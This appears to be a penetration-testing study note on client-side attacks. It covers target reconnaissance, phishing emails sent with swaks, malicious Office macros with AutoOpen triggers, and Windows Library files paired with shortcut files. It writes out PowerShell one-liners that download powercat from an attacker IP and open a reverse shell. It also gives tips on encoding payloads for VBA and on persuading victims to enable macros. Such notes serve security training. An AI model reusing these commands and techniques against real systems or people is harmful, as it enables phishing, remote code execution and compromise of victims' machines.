* Target Reconnaissance: Find information of what softwares are used by the target inorder to craft appropriate client-side attacks.
	* Information Gathering:
		* Examine metadata from publicly available generated from the target.
		* Use google dork/hacking: **site:example.com filetype:pdf** 
		* Download the file and examine the metadata using: **exiftool -a -u filename**
	* Client fingerprinting: Perform an attack that reveals a target's os, browser etc.
		* [Canarytokens](https://canarytokens.org/generate) is a tool to create web tokens and embed them into a URL.
		* In a phishing email scenario, a user would access the URL and information that the website in the web token is accessed can be viewed by the attacked. The webtoken can also contains javascript for client fingerprinting.
		* The tokens can be embbedsed in a word or pdf document to trigger when a victim opens the file.
* Crafting phishing email using swaks:
	* Techniques below require that a phihsing email needs to be sent to victim. Use swaks.
	* `sudo swaks -t <recipient address> -t <recipient address> --from <sender address> --attach @<attachment> --server <mail server ip> --body @<email body file> --header "Subject: <Subject>" --suppress-data -ap`
* Exploiting Microsoft office:
	* Mark of the Web (MOTW): In Windows, when files are downloaded from the Internet, they are tagged with a hidden NTFS Alternate Data Stream (ADS) named `Zone.Identifier` with a specific value known as the MOTW. This for example causes programs such as Office documents to open in protected view, disable macros etc.
	* Ensure within a Microsoft document or excel sheet or any product that Macros are enabled. The victim must be convinced to enable them.
	* In the view tab select Macros and create a new macro. Make sure that macro is selected in the document when creating the macro. This important so that the macro is saved in the document. 
	* Assuming the macro is named "mymacro" then create two more macros AutoOpen(), Document_Open() that runs mymacro. These two macros run when the document is opened. 
	* Inserting payload in the macro: 
		* A sample macro can be found in [[Sample Macro]]
		* The attack is the following powershell command: `IEX(New-Object System.Net.WebClient).DownloadString('http:// <attack ip>/powercat.ps1');powercat -c <attack ip> -p <attack port> -e powershell`
		* It download powercat from attack machine and executes a reverse shell.
		* The payload should be converted to base64 to avoid illegal characters in VBA. Ensure that destination character set Unicode 16 Little endian (UTF16LE) which is the character set used in powershell. Preferably use pwsh or PowerShell to create this payload.
		* VBA doesn't accept string literal beyond 255 characters. Therefore, the payload must be stored in a variable and with multiple statements that concatenate the variable in chunks.
		* Use ActiveX object class method CreateObject("Wscript.exe").Run \<variable name\> to execute the powershell command.
* Attacks using Windows Library files:
	* .Library-ms file are XML files that when double clicked upon connects to a remote location.
	* Refer to [[Sample Library file]]. 
	* Refer to [Malicious Library file](https://medium.com/@chrisjaggers19/rogue-libraries-malicious-links-that-live-on-your-desktop-fbcd1bc24ab4) for its explanation
	* Most spam filters in email do not filter out library files.
	* The attack:
		* Prepare a WebDAV share (a http server share). Command to host it: `/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/`
		* Craft a malicious windows shortcut file (.lnk) in a windows machine with a powershell command, to reverse shell using powercat, placed in the location field of the shortcut creation prompt. 
		* The powershell command: `powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<attack ip>:8000/powercat.ps1'); powercat -c <attack ip> -p <attack port> -e powershell"`
		* In the windows machine open the library file which connects to the webdav share hosted on the attack machine and place the shortcut file in it.
		* Craft a phishing email with the library file and send it your victim.
		* Ensure you set up a listener using nc and set up a python sever to sever powercat.
		* Victim unknowing clicks on config file which redirects to the webdav share and clicks on the shortcut executing the powershell revereshell.